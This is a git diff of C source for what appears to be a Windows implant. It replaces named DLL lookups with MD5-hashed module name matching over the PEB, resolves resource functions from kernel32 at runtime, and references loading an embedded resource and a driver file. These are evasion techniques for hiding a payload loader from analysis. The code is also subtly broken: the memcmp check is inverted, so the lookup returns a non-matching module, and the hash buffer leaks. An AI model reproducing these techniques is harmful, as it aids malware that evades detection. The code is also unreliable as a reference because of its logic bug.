@@ -14,24 +14,27 @@
 
 #include "implant_rsrc.h"
 #include "resource.h"
-
+#include "mdmain.h"
 
 PEB* RtlGetCurrentPeb(VOID)
 {
     return NtCurrentTeb()->ProcessEnvironmentBlock;
 }
 
-PVOID SelfGetModuleHandle(PCWSTR name) {
+PVOID SelfGetModuleHandle(uint8_t name[16]) {
 
     PEB* pPeb = RtlGetCurrentPeb();
     PPEB_LDR_DATA pLdr = pPeb->Ldr;
     PLIST_ENTRY current = pPeb->Ldr->InMemoryOrderModuleList.Flink;
+    uint8_t* result = malloc(16);
     while ((current != NULL) && (current != &pPeb->Ldr->InMemoryOrderModuleList))//stackoverflow modification
     {
         LDR_DATA_TABLE_ENTRY* module = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);//stackoverflow modification
-        if (StrCmpW((wcsrchr(module->FullDllName.Buffer, L'\\') + 1), name) == 0) {
+        wmd5String((wcsrchr(module->FullDllName.Buffer, L'\\') + 1), result);
+        if (memcmp(result, name, 16)) {
             return module->DllBase;
         }
+
         current = current->Flink;
     }
     return NULL;
@@ -64,30 +67,76 @@ double
     double a,
     double b
     );
-
-
+typedef
+HRSRC 
+(__stdcall* FINDRESSOURCEA)(
+    HMODULE hModule,
+    LPCSTR  lpName,
+    LPCSTR  lpType
+);
+typedef
+HGLOBAL 
+(__stdcall* LOADRESSOURCE)(
+    HMODULE hModule,
+    HRSRC   hResInfo
+);
+typedef
+DWORD 
+(__stdcall* SIZEOFRESSOURCE)(
+    HMODULE hModule,
+    HRSRC   hResInfo
+);
+typedef 
+LPVOID 
+(__stdcall* LOCKRESSOURCE)(
+    HGLOBAL hResData
+);
 int main() {
-    HMODULE dllBase = (HMODULE)SelfGetModuleHandle(L"ntdll.dll");
-    if (dllBase == NULL) {
-        printf("Error %p\n", dllBase);
+    //HMODULE ntdllBase = (HMODULE)SelfGetModuleHandle(L"ntdll.dll");
+    uint8_t data[16] = { 0xc2,0x31,0xf2,0x33,0xa8,0x60,0xbb,0x48,0x74,0x6f,0xc9,0x3d,0xbe,0x8c,0x7b,0x32 };
+
+    HMODULE kerneldllBase = (HMODULE)SelfGetModuleHandle(data);
+    if (kerneldllBase == NULL) {
+        printf("Error Kernel32.dll doesnt exist");
+        return 1;
+    }
+    /*
+    if (ntdllBase == NULL) {
+        printf("Error %p\n", ntdllBase);
     }
     else {
-        POW pow = (POW)SelfGetProcAddress(dllBase, "pow");
+        POW pow = (POW)SelfGetProcAddress(ntdllBase, "pow");
         printf("%f\n", pow(2.0, 3.0));
     }
-    HRSRC BmpRessource = FindResource(NULL, MAKEINTRESOURCE(IDB_BITMAP1), MAKEINTRESOURCE(2));
-    HGLOBAL GlobalRessource = LoadResource(NULL, BmpRessource);
+    */
+    /*
+    FINDRESSOURCEA FindResourceW_ = (FINDRESSOURCEA)SelfGetProcAddress(kerneldllBase, "FindResourceW");
+    HRSRC BmpRessource = FindResourceW_(NULL, MAKEINTRESOURCE(IDB_BITMAP1), MAKEINTRESOURCE(2));
+
+    LOADRESSOURCE LoadResource_ = (LOADRESSOURCE)SelfGetProcAddress(kerneldllBase, "LoadResource");
+    HGLOBAL GlobalRessource = LoadResource_(NULL, BmpRessource);
     if (!GlobalRessource) {
         printf("Global Ressource Error !!!");
         return 1;
     }
-    size_t FileSize = SizeofResource(NULL, BmpRessource);
-    uint8_t* FilePtr = (uint8_t*)LockResource(GlobalRessource);
+    SIZEOFRESSOURCE SizeofRessource_ = (SIZEOFRESSOURCE)SelfGetProcAddress(kerneldllBase, "SizeofResource");
+    size_t FileSize = SizeofRessource_(NULL, BmpRessource);
+    LOCKRESSOURCE LockResource_ = (LOCKRESSOURCE)SelfGetProcAddress(kerneldllBase, "LockResource");
+    uint8_t* FilePtr = (uint8_t*)LockResource_(GlobalRessource);
     for (size_t i = 0; i < FileSize; i++)
     {
         printf("%x", FilePtr[i]);
+    }*/
+
+    /*
+    char* data = "Salut!";
+    uint8_t *result = malloc(16);
+    md5String(data, result);
+    for (size_t i = 0; i < 16; i++)
+    {
+        printf("%x", result[i]);
     }
-    //printf("%p", BmpRessource);
+    */
     printf("\nFinish !\n");
     //SYSTEM_LOAD_AND_CALL_IMAGE Image;
     //WCHAR mypath[] = L"./driver.sys";
